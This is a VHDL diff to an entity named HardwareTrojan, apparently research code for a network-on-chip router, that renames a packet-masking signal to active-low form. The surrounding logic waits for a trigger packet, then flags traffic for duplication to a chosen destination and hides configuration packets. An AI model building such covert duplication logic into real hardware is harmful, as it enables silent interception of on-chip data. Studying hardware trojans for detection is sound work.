@@ -21,7 +21,7 @@ entity HardwareTrojan is
         duplicate : 	out std_logic;      -- to inform the SW that the packet must be duplicated
         configPckt : 	in regNport;        -- informs the presence of a config packet inside the buffer
         turnOff :       in regNport;
-        maskPckt_o :     out std_logic
+        n_maskPckt_o :     out std_logic
         );
 end HardwareTrojan;
 
@@ -30,7 +30,7 @@ architecture HardwareTrojan of HardwareTrojan is
 type HTState is (S0, waiting, readDestination, waitHeader, transmitting);
 signal state : HTState;
 signal destination, dest : regmetadeflit;
-signal maskPckt, turnOff_or : std_logic;
+signal n_maskPckt, turnOff_or : std_logic;
 signal zeros : std_logic_vector(METADEFLIT-2 downto 0);
 
 begin
@@ -48,7 +48,7 @@ begin
 
                 -- Waiting the awakening packet
                 when waiting =>
-                    if maskPckt = '0' and turnOff_or = '0' then -- trocar para pckt -- use n_
+                    if n_maskPckt = '0' and turnOff_or = '0' then -- trocar para pckt -- use n_
                         state <= readDestination;
                     else
                         state <= waiting;
@@ -92,9 +92,9 @@ begin
     duplicate <= '1' when state = waitHeader or state = transmitting else '0';
 
     -- Mascara o pacote de configuração para o IP!
-    maskPckt <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or configPckt(4) = '1' or turnOff_or = '1' else '1';
+    n_maskPckt <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or configPckt(4) = '1' or turnOff_or = '1' else '1';
     turnOff_or <= '1' when turnOff(0) = '1' or turnOff(1) = '1' or turnOff(2) = '1' or turnOff(3) = '1' or turnOff(4) = '1' else '0';
-    maskPckt_o <= maskPckt;
+    n_maskPckt_o <= n_maskPckt;
 
     -- Mux to define the address source
     dest <= destAddr(0) when configPckt(0) = '1' else
